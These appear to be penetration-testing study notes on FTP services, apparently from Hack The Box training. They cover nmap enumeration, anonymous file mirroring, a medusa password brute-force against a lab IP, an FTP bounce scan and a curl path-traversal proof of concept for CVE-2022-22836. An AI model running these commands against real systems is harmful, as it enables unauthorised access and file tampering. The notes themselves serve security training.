```
# Nmap

find / -type f -name ftp* 2>/dev/null | grep scripts
sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace
```

| **Command**                                               | **Description**                                                         |
| --------------------------------------------------------- | ----------------------------------------------------------------------- |
| `ftp <FQDN/IP>`                                           | Interact with the FTP service on the target.                            |
| `nc -nv <FQDN/IP> 21`                                     | Interact with the FTP service on the target.                            |
| `telnet <FQDN/IP> 21`                                     | Interact with the FTP service on the target.                            |
| `openssl s_client -connect <FQDN/IP>:21 -starttls ftp`    | Interact with the FTP service on the target using encrypted connection. |
| `wget -m --no-passive ftp://anonymous:anonymous@<target>` | Download all available files on the target FTP server.                  |

```
# User not permitted to FTP

HTB-ACADEMY@htb[/htb]$ cat /etc/ftpusers

# Trouble shooting

ftp> debug
ftp> trace
ftp> ls -R            # recursive listing

# Commands

put file.txt
get file.txt
status
verbose
```

### **Brute forcing**
```bash
Orbixio@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
```
### **FTP Bounce Attack**
![](https://academy.hackthebox.com/storage/modules/116/ftp_bounce_attack.png)

Source: [https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/](https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/)

```shell-session
Orbixio@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
```

**CoreFTP before build 727 [CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836)**

```shell-session
Orbixio@htb[/htb]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```


## References
- [https://www.smartfile.com/blog/the-ultimate-ftp-commands-list](https://www.smartfile.com/blog/the-ultimate-ftp-commands-list)
- [https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes](https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes)